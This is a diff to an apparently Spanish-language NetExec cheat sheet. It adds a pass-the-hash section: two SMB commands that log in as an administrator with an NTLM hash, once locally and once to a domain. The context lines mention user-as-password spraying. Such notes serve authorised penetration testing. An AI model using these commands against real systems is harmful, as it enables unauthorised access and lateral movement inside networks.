@@ -67,6 +67,17 @@ nxc smb 192.168.1.10 -u /ruta/usuarios.txt -p '' -d miempresa.local --user-as-pa
 ```
 >Comprueba mismo usuario y contraseña
 
+## Pass-the-hash
+```
+nxc smb 192.168.1.50 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:7afe0344c34e0e4745864c235c03c52e' --local-auth
+```
+> Autenticación local usando Hash NTLM (LM:NT)
+
+```
+nxc smb 192.168.1.10 -u 'admin.dominio' -H '7afe0344c34e0e4745864c235c03c52e' -d miempresa.local
+```
+Autenticación en el dominio usando solo el Hash NT (Dejando la parte LM vacía)
+
 ## Enumetarion users + groups + computers + policy
 
 ```
